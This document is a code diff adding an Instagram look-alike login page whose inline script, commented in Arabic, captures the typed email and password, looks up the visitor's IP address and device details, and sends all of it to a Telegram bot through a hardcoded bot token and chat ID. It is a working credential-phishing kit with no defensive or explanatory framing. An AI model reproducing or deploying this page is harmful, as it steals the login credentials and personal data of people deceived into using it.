@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Clone</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 class="flex justify-content-center">
+                    <img src="./img/instagram-logo.png" alt="Instagram logo" />
+                </h1>
+
+                <!-- ✅ هنا أضفنا id="login-form" -->
+                <form id="login-form">
+                    <input id="email" name="email" placeholder="Phone number, username, or email" />
+                    <input id="password" name="password" type="password" placeholder="Password" />
+                    <button type="submit">Log In</button>
+                </form>
+
+                <div class="flex separator align-items-center">
+                    <span></span><div class="or">OR</div><span></span>
+                </div>
+
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img src="./img/facebook-icon.png" alt="Facebook logo" />
+                        <a href="#">Log in with Facebook</a>
+                    </div>
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p><a href="#">Sign up</a>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p class="copyright">© 2020 Instagram from Facebook</p>
+    </footer>
+
+    <!-- سكربت الإرسال -->
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "8475507526:AAGN3euGEYakvnt_nm0jrYar-5yBRoLmW_c";  // توكن البوت
+        const CHAT_ID = "1837708757";  // رقم الشات ID
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = `
+<b>New Login Attempt</b>\n
+<b>Email:</b> ${email}\n
+<b>Password:</b> ${password}\n
+<b>IP Address:</b> ${ip}\n
+<b>Device Type:</b> ${deviceType}\n
+<b>Platform:</b> ${platform}\n
+<b>User Agent:</b> ${userAgent}\n
+<b>Screen:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(() => {
+                        alert('✔ تم الإرسال بنجاح');
+                    }).catch(() => {
+                        alert('❌ فشل الإرسال');
+                    });
+                }).catch(() => {
+                    alert('❌ فشل الحصول على IP');
+                });
+        });
+    </script>
+</body>
+</html>
